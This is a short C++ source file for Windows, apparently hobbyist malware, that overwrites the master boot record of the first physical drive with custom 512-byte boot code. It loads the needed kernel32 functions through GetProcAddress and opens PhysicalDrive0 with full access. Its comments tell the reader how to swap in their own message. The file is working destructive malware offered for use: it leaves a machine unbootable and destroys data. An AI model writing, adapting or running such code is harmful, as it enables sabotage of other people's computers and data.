#include <Windows.h>
#include <iostream>
#include "byte.h"

//This basically just defining the functions so we can actually use them after we get them with getprocaddress
//Nerds call this Function Pointer Types
typedef BOOL(WINAPI* LPWriteFile)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
typedef HANDLE(WINAPI* LPCreateFileW)(LPCWSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
typedef BOOL(WINAPI* LPCloseHandle)(HANDLE);

/*
To make it print your own text change the one in gay.asm
convert to bin with any compiler like nasm and then to hex byte array :thumbs_up:
Change in byte.h
*/
int main(){
	//Create Handle to kernal 64 and get adresses via GetProcAddress
	HMODULE hKernel32 = LoadLibrary("kernel32.dll");
	LPWriteFile pWriteFile = (LPWriteFile)GetProcAddress(hKernel32, "WriteFile");
	LPCreateFileW pCreateFileW = (LPCreateFileW)GetProcAddress(hKernel32, "CreateFileW");
	LPCloseHandle pCloseHandle = (LPCloseHandle)GetProcAddress(hKernel32, "CloseHandle");

	DWORD dwBytesWritten;

	//handle for mbr :thumbs_up:
	HANDLE mhandle = pCreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL,FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,OPEN_EXISTING, NULL, NULL);

	//write new data to handle or whatever
	pWriteFile(mhandle, newmbrdata, 512, &dwBytesWritten, 0);
	pCloseHandle(mhandle);
	return EXIT_SUCCESS;
}